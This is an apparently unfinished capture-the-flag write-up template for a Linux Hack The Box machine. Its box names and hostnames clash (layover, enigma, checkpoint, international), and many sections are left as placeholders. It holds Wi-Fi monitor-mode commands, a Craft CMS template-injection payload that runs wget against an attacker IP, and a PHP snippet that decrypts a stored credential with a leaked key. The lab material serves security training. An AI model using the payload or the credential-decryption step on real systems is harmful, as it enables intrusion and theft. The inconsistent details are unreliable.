# layover.htb

> **OS:** Linux\
> **Difficulty:** medium\
> **IP:** `10.10.x.x`\
> **Date:** 03-07-2026

***

### TL;DR

<...>

**Chain:**&#x20;

***

### Box Info

|                |                                  |
| -------------- | -------------------------------- |
| **Name**       | enigma.htb                       |
| **OS**         | Linux                            |
| **Difficulty** | Easy                             |
| **Release**    | Released on 26th September, 2026 |
| **Key skills** | <...>                            |

***

### 1. Recon

#### 1.1 Port scan

```bash
```

#### 1.2 Initial observations

* Hostname / domain: dc01.checkpoint.htb
*   Added to `/etc/hosts`:<br>

    ```
    10.10.x.x
    ```

#### 1.3 tool-x output

Run `` `tool-x` ``

```bash
command
```

### 2. Foothold / Initial Access

#### 2.1 Description

> ...

#### 2.2 Exploitation



<...>

```bash
# 1. kill interfering processes
sudo airmon-ng check kill
 
# 2. monitor mode (creates e.g. wlan3mon)
sudo airmon-ng start wlan3
 
# 3. scan for the target - note SSID (OPN=open), BSSID, confirm CH 6
sudo airodump-ng --band bg wlan3mon
 
# 4. tune to channel 6 (2.4 GHz is 20 MHz, no width needed)
sudo iw dev wlan3mon set channel 6
```

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-01 om 15.41.58.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-01 om 15.40.27.png" alt=""><figcaption></figcaption></figure>

<...>

create a pivot to the Wi-Fi network

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-01 om 16.15.44.png" alt=""><figcaption></figcaption></figure>

<...>

logging into the craftCMS host

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-01 om 16.34.53.png" alt=""><figcaption></figcaption></figure>

<...>

navigate to [http://portal.international.htb/admin/content/entries?source=\*](http://portal.international.htb/admin/content/entries?source=*)

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.49.18.png" alt=""><figcaption></figcaption></figure>

Then intercept a request where the filter is being utilized

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.49.42.png" alt=""><figcaption></figcaption></figure>

And in the intercepted request, adjust the following:

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.51.08.png" alt=""><figcaption><p>Original request: JSON filters</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.55.00.png" alt=""><figcaption><p>Adjusted request: Code execution achieved <code>{{[['wget+http://10.13.37.182:8080/test']|filter('system')]}}</code></p></figcaption></figure>

***

### 3. Privilege Escalation

#### 3.1 Description

>

```
```



> www-data to aporter

find the .env file > continue to privesc

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-03 om 15.09.41.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.58.37.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.59.56.png" alt=""><figcaption></figcaption></figure>

<...>

```php
<?php

require '/var/www/portal/vendor/autoload.php';
require '/var/www/portal/vendor/craftcms/cms/bootstrap/console.php';

$password = Craft::$app->getSecurity()->decryptByKey(base64_decode("u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w="), "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr");
echo $password;

?>
```

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 11.02.37.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 11.03.09.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-03 om 17.14.54.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-08 om 15.38.12.png" alt=""><figcaption></figcaption></figure>

<...>
